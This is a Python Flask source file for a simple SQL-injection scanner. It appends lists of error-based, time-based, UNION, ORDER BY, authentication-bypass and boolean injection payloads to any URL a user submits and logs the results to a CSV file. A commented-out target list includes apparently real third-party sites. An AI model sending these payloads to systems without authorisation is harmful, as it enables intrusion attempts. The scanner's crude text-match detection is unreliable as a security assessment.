from flask import Flask, redirect, url_for, render_template, request
import requests
import time
import csv

# Function to make requests and handle timeouts
def make_request(url):
    try:
        response = requests.get(url, timeout=5)  # Adjust the timeout value as needed
        return response
    except requests.exceptions.Timeout:
        # print(f"Timeout occurred while making a request to {url}")
        return None
    except requests.RequestException as e:
        # print(f"Error making request: {e}")
        return None


# Error Based Injection Scanner
def check_error_payload(url):
    # List of common error-based payload keywords
    error_payloads = ["'", "\"", "1=1", "1'1", "1\"1", "OR 1=1", "SELECT"]

    try:
        # Send a request to the URL with each payload
        for payload in error_payloads:
            modified_url = f"{url}{payload}"
            response = make_request(modified_url)
            # response = requests.get(modified_url)
            if response is not None:
                # Check if the response contains an error message
                if "error" in response.text.lower():
                    return f"😈 Potential error-based payload found: {payload}"

        return "✅ No error-based payload found."

    except requests.RequestException as e:
        return f"Error making request: {e}"

# Time Based Injection Scanner
def check_time_payload(url):
    # Time delay for comparison 
    time_delay = 3  

    try:
        # Send a request to the URL with a time-based payload
        payload = f"' AND IF(1=1, SLEEP({time_delay}), 0)--"
        modified_url = f"{url}{payload}"

        start_time = time.time()
        # response = requests.get(modified_url)
        response = make_request(modified_url)
        if response is not None:
            end_time = time.time()

            # Check if the response time indicates a delay
            if end_time - start_time > time_delay:
                return f"😈 Potential time-based payload found: {payload}"

        return "✅ No time-based payload found."

    except requests.RequestException as e:
        return f"Error making request: {e}"

# Union Based Injection Scanner
def check_union_payload(url):
    # List of common union-based payload examples
    union_payloads = ["' UNION SELECT 1,2,3--", "\" UNION SELECT 1,2,3--"]

    try:
        # Send a request to the URL with each union-based payload
        for payload in union_payloads:
            modified_url = f"{url}{payload}"
            # response = requests.get(modified_url)
            response = make_request(modified_url)

            if response is not None:
                # Check if the response contains an indication of successful injection
                if "union" in response.text.lower():
                    return f"😈 Potential union-based payload found: {payload}"

        return "✅ No union-based payload found."

    except requests.RequestException as e:
        return f"Error making request: {e}"

# Order By Payload
def check_order_by_payload(url):
    # Attempting a generic Union Select payload with ORDER BY
    order_by_payload = "' ORDER BY 1--"

    try:
        # Send a request to the URL with the ORDER BY payload
        modified_url = f"{url}{order_by_payload}"
        # response = requests.get(modified_url)
        response = make_request(modified_url)

        if response is not None:
            # Check if the response contains an indication of successful injection
            if "error" in response.text.lower():
                return f"😈 Potential ORDER BY payload found: {order_by_payload}"

        return "✅ No ORDER BY payload found."

    except requests.RequestException as e:
        return f"Error making request: {e}"

# Authorization Based Injection Scanner
def check_auth_bypass_payload(url):
    # List of common SQL injection auth bypass payloads
    auth_bypass_payloads = [
        "' OR '1'='1'--",
        "' OR 'a'='a'--",
        "\" OR \"1\"=\"1\"--",
        "\" OR \"a\"=\"a\"--",
        "' OR 1=1--",
        "\" OR 1=1--",
        "' OR a=a--",
        "\" OR a=a--",
    ]

    try:
        # Send a request to the URL with each auth bypass payload
        for payload in auth_bypass_payloads:
            modified_url = f"{url}{payload}"
            # response = requests.get(modified_url)
            response = make_request(modified_url)

            if response is not None:
                # Check if the response indicates successful authentication bypass
                if "welcome" in response.text.lower():
                    return f"😈 Potential SQL Injection Auth Bypass Payload found: {payload}"

        return "✅ No Auth Bypass Payload found."

    except requests.RequestException as e:
        return f"Error making request: {e}"

# Boolean Based Injection Scanner
def check_boolean_payload(url):
    # List of common boolean-based payloads
    boolean_payloads = [
        "' OR 1=1--",
        "\" OR 1=1--",
        "' OR 'a'='a'--",
        "\" OR \"a\"=\"a\"--",
        "' OR TRUE--",
        "\" OR TRUE--",
        "' OR FALSE--",
        "\" OR FALSE--",
    ]

    try:
        # Send a request to the URL with each boolean payload
        for payload in boolean_payloads:
            modified_url = f"{url}{payload}"
            # response = requests.get(modified_url)
            response = make_request(modified_url)

            if response is not None:
                # Check if the response indicates successful injection
                if "error" in response.text.lower() or "welcome" in response.text.lower():
                    return f"😈 Potential boolean-based payload found: {payload}"

        return "✅ No boolean-based payload found."

    except requests.RequestException as e:
        return f"Error making request: {e}"

# Function to add site to csv file
def add_to_csv(data):
    with open("./sites.csv", "a", encoding="utf-8", newline="\n") as file:
        obj = csv.writer(file)
        # print(data)
        obj.writerow(data)
        # print("CSV file updated")

# Combines all the functions for generating payloads
def sqli_check(url):
    payload_result = []
    payload_result.append(check_error_payload(url))
    payload_result.append(check_time_payload(url))
    payload_result.append(check_union_payload(url))
    payload_result.append(check_auth_bypass_payload(url))
    payload_result.append(check_order_by_payload(url))
    payload_result.append(check_boolean_payload(url))
    return payload_result

# SQLi Scanner
def sqli_scanner(url):
    # url = ["http://testphp.vulnweb.com/artists.php?artist=1","https://www.lghk.com/news.php?id=5",
    #        "http://testphp.vulnweb.com/listproducts.php?cat=1", "https://www.cliqnship.com/latest-promos.php?id=98"]
    # for i in url:
        # print("Scanning url : ", i)    
    
    result = []
    result = sqli_check(url)
    return result

app = Flask(__name__)

@app.route("/")
def home():
    # return render_template("index.html")
    return redirect(url_for("success"))


@app.route("/success", methods=["POST", "GET"])
def success():
    if request.method == "POST":
        url_input = request.form["nm"]
        output = sqli_scanner(url_input)
        # print("Output = ", [url_input]+output)
        add_to_csv([url_input]+output)
        return render_template("index.html", content=output, u="URL : "+url_input)
    else:
        return render_template("index.html")

@app.route("/prevent")
def prevent():
    return render_template("prevention.html")

if __name__ == "__main__":
    app.run(debug=True)